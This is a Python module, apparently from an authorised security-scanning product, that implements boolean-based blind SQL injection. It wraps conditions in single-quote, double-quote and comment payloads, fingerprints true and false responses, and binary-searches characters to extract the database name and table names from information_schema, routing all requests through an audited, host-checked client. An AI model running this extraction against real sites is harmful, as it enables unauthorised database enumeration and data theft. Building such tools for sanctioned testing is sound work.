# -*- coding: utf-8 -*-
"""AI/规则布尔盲注自测：不依赖 sqlmap，按已确认 Payload 适配引号语境与真假判据。

支持：
  - 双引号：1" and ({cond}) and "1"="1
  - 单引号：1' and ({cond}) and '1'='1
  - 注释收尾：1' and ({cond})--

只抽库名 + 表名。
"""
from __future__ import annotations

import hashlib
import re
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from app.services.event_bus import bus


def infer_quote_style(payload: str | None) -> str:
    """从 sqlmap 确认 payload 推断引号语境。返回 double|single|single_comment。"""
    p = payload or ""
    if re.search(r'\d+"\)?\s*and', p, re.I) or '")' in p or "\"=\"" in p:
        return "double"
    if re.search(r"--\s*$", p) or "-- -" in p:
        return "single_comment"
    if "'" in p:
        return "single"
    return "single"


def wrap_condition(base: str, cond: str, style: str) -> str:
    if style == "double":
        return f'{base}" and ({cond}) and "1"="1'
    if style == "single_comment":
        return f"{base}' and ({cond})--"
    return f"{base}' and ({cond}) and '1'='1"


class BooleanBlindExtractor:
    def __init__(self, client, url: str, param: str = "id", base_value: str = "1",
                 quote_style: str = "single", task_id: int | None = None):
        # 所有请求必须走 SafeHttpClient：授权 host 校验 + 限速 + 熔断 + 审计。
        # 旧实现用裸 httpx 且只支持 GET，是产品自身管控缺口（2026-10-15 记录）。
        if client is None:
            raise ValueError("BooleanBlindExtractor 需要 SafeHttpClient（禁止裸 httpx）")
        self.client = client
        self.url = url
        self.param = param
        self.base_value = base_value
        self.quote_style = quote_style
        self.task_id = task_id
        self.requests = 0
        self.true_fp: str | None = None
        self.false_fp: str | None = None

    def close(self):
        # 客户端由调用方持有，这里不关闭
        return None

    def _request(self, payload: str) -> tuple[int, str]:
        parsed = urlparse(self.url)
        q = dict(parse_qsl(parsed.query, keep_blank_values=True))
        q[self.param] = payload
        new = urlunparse(parsed._replace(query=urlencode(q)))
        self.requests += 1
        resp = self.client.request("GET", new, payload=payload,
                                   headers={"User-Agent": "mhszed-sql-ai-blind/0.3"})
        return resp.status_code, resp.text or ""

    @staticmethod
    def _fp(body: str) -> str:
        # 长度 + 摘要，避免把整页存状态
        return f"{len(body)}:{hashlib.md5(body.encode('utf-8', 'replace')).hexdigest()[:12]}"

    def calibrate(self) -> bool:
        """发 1=1 / 1=2 校准真假指纹；失败则试关键字。"""
        try:
            _, tbody = self._request(wrap_condition(self.base_value, "1=1", self.quote_style))
            _, fbody = self._request(wrap_condition(self.base_value, "1=2", self.quote_style))
        except Exception as exc:
            bus.publish("scan", f"[AI盲注] 校准请求失败: {exc}", task_id=self.task_id, level="warn")
            return False
        tfp, ffp = self._fp(tbody), self._fp(fbody)
        if tfp != ffp:
            self.true_fp, self.false_fp = tfp, ffp
            bus.publish("scan", f"[AI盲注] 指纹校准成功 style={self.quote_style}",
                        task_id=self.task_id, level="success")
            return True
        # 关键字兜底
        def kw_true(b: str) -> bool | None:
            if any(x in b for x in ('"exists":true', "用户存在", "存在记录", "查询成功")):
                return True
            if any(x in b for x in ('"exists":false', "用户不存在", "不存在", "无结果", "Not Found")):
                return False
            return None
        kt, kf = kw_true(tbody), kw_true(fbody)
        if kt is True and kf is False:
            self.true_fp, self.false_fp = "kw:true", "kw:false"
            bus.publish("scan", "[AI盲注] 关键字校准成功", task_id=self.task_id, level="success")
            return True
        bus.publish("scan", "[AI盲注] 校准失败：真假响应无差异", task_id=self.task_id, level="warn")
        return False

    def _is_true(self, body: str) -> bool:
        if self.true_fp == "kw:true":
            if any(x in body for x in ('"exists":true', "用户存在", "存在记录", "查询成功")):
                return True
            if any(x in body for x in ('"exists":false', "用户不存在", "不存在", "无结果")):
                return False
            return False
        fp = self._fp(body)
        if self.true_fp and fp == self.true_fp:
            return True
        if self.false_fp and fp == self.false_fp:
            return False
        # 接近真指纹（长度差小）当 true
        return self.true_fp is not None and fp.split(":")[0] == self.true_fp.split(":")[0]

    def _inject(self, condition: str) -> bool:
        payload = wrap_condition(self.base_value, condition, self.quote_style)
        try:
            _, body = self._request(payload)
            return self._is_true(body)
        except Exception as exc:
            bus.publish("scan", f"[AI盲注] 请求失败: {exc}", task_id=self.task_id, level="warn")
            return False

    def _binsearch_len(self, expr: str, max_len: int = 64) -> int:
        lo, hi = 0, max_len
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._inject(f"length(({expr}))>={mid}"):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def _binsearch_ascii(self, expr: str, pos: int) -> int:
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._inject(f"ascii(substr(({expr}),{pos},1))>={mid}"):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def extract_expr(self, expr: str, max_len: int = 40, label: str = "") -> str:
        bus.publish("scan", f"[AI盲注] 提取 {label or expr}", task_id=self.task_id)
        length = self._binsearch_len(expr, max_len=max_len)
        if length <= 0:
            return ""
        length = min(length, max_len)
        chars = []
        for i in range(1, length + 1):
            code = self._binsearch_ascii(expr, i)
            if code < 32 or code > 126:
                break
            chars.append(chr(code))
            if i % 4 == 0:
                bus.publish("scan", f"[AI盲注] {label} {i}/{length}: {''.join(chars)}",
                            task_id=self.task_id)
        return "".join(chars)

    def extract_database(self) -> str:
        return self.extract_expr("database()", max_len=32, label="database()")

    def extract_tables(self, max_tables: int = 8) -> list[str]:
        count_expr = (
            "select count(*) from information_schema.tables where table_schema=database()"
        )
        lo, hi = 0, max_tables
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._inject(f"({count_expr})>={mid}"):
                lo = mid
            else:
                hi = mid - 1
        n = min(lo, max_tables)
        tables = []
        for idx in range(n):
            expr = (
                f"select table_name from information_schema.tables "
                f"where table_schema=database() limit {idx},1"
            )
            name = self.extract_expr(expr, max_len=40, label=f"table[{idx}]")
            if name:
                tables.append(name)
            else:
                break
        return tables


def run_boolean_fallback(url: str, param: str, task_id: int | None = None,
                         want_tables: bool = True, payload_hint: str | None = None,
                         base_value: str = "1", *, client) -> dict:
    """AI/规则布尔自测入口。client 必须是 SafeHttpClient。"""
    styles = []
    primary = infer_quote_style(payload_hint)
    styles.append(primary)
    for s in ("single", "double", "single_comment"):
        if s not in styles:
            styles.append(s)

    last_err = None
    for style in styles:
        ex = BooleanBlindExtractor(
            client=client, url=url, param=param or "id", base_value=base_value or "1",
            quote_style=style, task_id=task_id,
        )
        try:
            if not ex.calibrate():
                last_err = f"style={style} 校准失败"
                continue
            dbname = ex.extract_database()
            tables: list[str] = []
            if dbname and want_tables:
                tables = ex.extract_tables()
            return {
                "db": dbname, "tables": tables, "requests": ex.requests,
                "quote_style": style, "error": None,
            }
        except Exception as e:
            last_err = str(e)
        finally:
            ex.close()
    return {"db": "", "tables": [], "requests": 0, "error": last_err or "全部语境校准失败"}
